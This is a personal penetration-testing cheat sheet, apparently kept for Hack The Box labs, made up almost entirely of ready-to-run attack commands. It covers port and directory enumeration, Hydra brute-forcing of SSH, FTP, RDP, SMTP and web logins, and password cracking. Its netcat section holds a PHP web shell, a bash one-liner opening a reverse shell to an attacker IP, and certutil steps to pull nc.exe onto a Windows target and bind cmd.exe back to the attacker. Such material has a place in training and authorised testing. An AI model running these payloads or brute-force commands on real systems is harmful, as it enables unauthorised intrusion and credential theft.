# Hackthebox
- default page ```/robots.txt``` ```/secret.txt```
- ```find / -name local.txt 2> /dev/null```
- ``` find -type d -name ".*" 2>/dev/null``` it will check hidden directories.
- [Useful_links](/links.md)
- [netcat](#nc)
- [Reverse_Shell_Script](https://revshells.com)
- [Nmap](/nmap.md)
- [Nmap](#nmap)
- [BurpSuite](#burp)
- [Gobuster](#gobuster)
- [FFUF](#ffuf)
- [Nikto](#nikto)
- [Privilege escalation](/Privilege.md)
- [Mysql](#mysql)
- [Hydra](#hydra) - Brute force attack on ssh
- [FTP](#ftp) 
- [Cewl](#cewl) - It is use to create a worldlist using website link
- [Brute-force attack](#bruteforce)
- [Password Cracking](#cracking)
- [Simple Local Web Servers](#localweb)
- [RDP-3389](#rdp)

- ## Cewl <a name="cewl"></a>
- ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```


# Enumeration
- ## Nmap <a name="nmap"></a>
- ```nmap -sC -sV -vv -oA nmap/report.txt <ip>```
- ```sudo nmap -Pn -A -p- -T4 <ip> -o nmap.txt```
- [Squid](https://github.com/aancw/spose.git) Pivoting Open Port Scanner
  - Detecting open port behind squid proxy for CTF and pentest purpose using http proxy method. Only for Python 3 version.
  - ```python3 spose.py --proxy http://192.168.208.189:3128 --target 192.168.208.189```
  - if you detect new port for example: 8080 then you need to config your proxy in firefox set ```HTTP proxy 192.168.208.189``` and ```port 3128```
  - then only you can viste the website http://192.168.208.189:8080


- ## Gobuster <a name="gobuster"></a>
```
gobuster dir -u <url> -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.60.132 -t 50 -x php,txt -o  gobuster.txt
```

```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.54.84 -t 100 -x .html,.txt,.php > gobuster.txt
```  


- ## FFUF <a name="ffuf"></a>
- FFUF is used to filter the invalid pages 
- ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt```
- ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -r -fs 27200```
  - if you are getting the size same of all use filter size and give the size there.
```
ffuf -u http://test.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H ‘Host: FUZZ.test.com’ -fs 0 -fs 65
```

- ## Nikto <a name="nikto"></a>
- ```nikto -h http://127.0.0.1```



 - ## Burp Suite <a name="burp"></a>
- use ```/manager/html``` or ```/..;/manager/html``` in the middel of ```GET/ HTTP/1.1```
  - so it will like this ```GET/ /..;/manager/html HTTP/1.1```
  - whenever you see JSESSIONID=.... use this.
 
- use ```[]==``` for the password if you don't know the pass 

- ## Mysql <a name="mysql"></a>
- ```mysql -u root -p -h $ip```




- ## Hydra <a name="hydra"></a>
- ssh renu@127.0.0.1
- ```hydra -l <username> -P /usr/share/wordlists/rockyou.txt <ipaddress> ssh -t 50```
- ```hydra -L users.txt -P passwords.txt ssh://192.168.245.48 -t 4 > hydra.txt```
- ```hydra -l root -P /usr/share/wordlists/rockyou.txt $ip mysql```


- ## FTP <a name="ftp"></a>
- ftp <ip>
  - user:anonymous
  - pass:
  - 230 Login successful
  - to upload a file use ```put <filename>```
  - to download a file use ```get <filename>```



- ## netcat <a name="nc"></a>
```php
<?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
?>
```
```Bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
__Download the reverse shell in windows__
  - > __First we need to host the file in your kali linux__
    - __`cd /usr/share/windows-binaries/`__
    - __`python -m SimpleHTTPServer 80`__
  - > __Go to the target windows system type the below command in the `cmd`__
    - __`certutil -urlcache -f http://<attacker_ip>/nc.exe net.exe`__
  - > __run the below command in kali linux__
    > __`nc -nvlp 1234`__
  - > __we need to run the file in target system__
    - __`new.exe -nv <attacker ip> 1234 -e cmd.exe`__











- ## Brute-force attack <a name="bruteforce"></a>


### Hydra FTP Brute Force
```
hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 ftp
```
```
hydra -L/usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.198.30.3 -t 4 ftp
```
### Hydra POP3 Brute Force
```
hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 -s 4567 pop3
```
### Hydra RDP
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>
```
### Hydra SMTP Brute Force
```
hydra -P /usr/share/wordlists/rockyou.txt 127.0.0.1 smtp -V
```
### Hydra SSH Brute Force
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
```
### Brute Forcing a Website Login
- Login page 
- http://127.0.0.0/DVWA/vulnerabilities/brute/index.php
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt  127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/index.php:userField=^USER^:passwordField=^PASS^"
```


- ## RDP-3389 <a name="rdp"></a>
```
xfreerdp /u:administrator /p:qwertyuiop /v:<target> ip:<port_number>
```

- ## Password Cracking <a name="cracking"></a>
### John The Ripper
```
john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
```




- ## Simple Local Web Servers <a name="localweb"></a>

```
python -m SimpleHTTPServer 80
```

```
python3 -m http.server
```

```
php -S 0.0.0.0:80
```

